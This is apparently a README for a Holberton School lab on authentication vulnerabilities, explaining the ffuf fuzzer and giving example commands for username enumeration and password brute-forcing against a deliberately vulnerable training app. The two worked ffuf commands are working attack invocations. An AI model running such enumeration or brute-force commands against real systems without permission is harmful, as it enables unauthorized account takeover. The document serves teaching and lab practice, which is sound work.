# WEB SECURITY
# Web Application Security: Authentication Vulnerabilities

This project is part of the Holberton School cybersecurity curriculum.

The goal is to understand and exploit common authentication vulnerabilities in a controlled lab environment, 

using a deliberately vulnerable web application called SecureCorp.

## Tasks

### Task 0 - User Enumeration

Identify valid usernames by exploiting subtle differences in application responses 

using `ffuf` and SecLists wordlists against the `/api/check_username` endpoint.

### Task 1 - Password Attacks

Perform brute-force attacks against the login endpoint using `ffuf` to crack weak passwords and gain unauthorized access.

## How to Use ffuf

ffuf (Fuzz Faster U Fool) is a fast web fuzzer used to discover endpoints, 

brute-force parameters, and enumerate users or passwords.

### Installation

```bash

sudo apt install ffuf -y

```

### Basic Syntax

```bash

ffuf -w <wordlist> -u <url> [options]

```

### Key Flags

| Flag | Description |

|------|-------------|

| `-w` | Path to wordlist file |

| `-u` | Target URL (use FUZZ as placeholder) |

| `-X` | HTTP method (GET, POST, etc.) |

| `-H` | Custom header |

| `-d` | POST data body |

| `-mc` | Match HTTP status codes |

| `-fs` | Filter by response size |

| `-t` | Number of concurrent threads |

| `-k` | Skip SSL certificate verification |

### Examples Used in This Project

**User Enumeration:**

```bash

ffuf -w /usr/share/seclists/Usernames/Names/names.txt \

     -u https://target/api/check_username \

     -X POST -H "Content-Type: application/json" \

     -d '{"username":"FUZZ"}' \

     -mc all -fs 162 -t 50

```

**Password Brute Force:**

```bash

ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \

     -u https://target/login \

     -X POST -d "username=admin&password=FUZZ" \

     -k -mc all -fs 12404 -t 20

```

## Tools Used

- `ffuf` - Web fuzzer for brute-forcing endpoints

- `curl` - HTTP request testing

- `SecLists` - Wordlists for usernames and passwords

- `Python3` - Custom brute-force scripts

## Disclaimer

This project is strictly for educational purposes within a controlled lab environment. Never apply these techniques against systems you do not own or have explicit permission to test.

